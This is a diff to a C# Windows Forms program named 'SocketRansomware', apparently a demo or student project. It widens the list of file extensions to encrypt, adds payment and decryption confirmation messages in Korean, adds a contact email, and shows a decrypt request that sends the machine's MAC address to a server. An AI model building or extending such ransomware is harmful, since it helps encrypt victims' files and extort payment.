@@ -17,7 +17,7 @@ namespace SocketRansomware
 {
     public partial class Form1 : Form
     {
-        readonly string[] extensions = { ".docx", ".hwp", ".jpg", ".png", ".txt", ".jpeg", ".pdf" };
+        readonly string[] extensions = { ".docx", ".hwp", ".jpg", ".png", ".txt", ".jpeg", ".pdf", ".ppt" };
         private string key;
         private const string PATH = @"C:\files";
         TcpClient client;
@@ -225,7 +225,7 @@ namespace SocketRansomware
             {
                 lbtimer2.Text = "00:00:00";
                 btnCheckPayment.Enabled = false;
-                btnDecrypt.Enabled = false;
+              
                 timer1.Stop();
               
             }
@@ -282,11 +282,13 @@ namespace SocketRansomware
         {
             string decrpyt = "decrypt;" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
             SendDataServer(decrpyt);
+            MessageBox.Show("결제 완료!");
         }
 
         private void btnDecrypt_Click(object sender, EventArgs e)
         {
             DecryptFiles(this.key);
+            MessageBox.Show("복호화 완료!");
         }
 
         private void cbboxLanguage_SelectedIndexChanged(object sender, EventArgs e)
@@ -306,7 +308,7 @@ namespace SocketRansomware
 
         private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            MessageBox.Show("Email Address: leeseong010@naver.com");
+            MessageBox.Show("Email Address1: leeseong010@naver.com\nEmail Address2: bestinwoo@gmail.com");
         }
     }
    
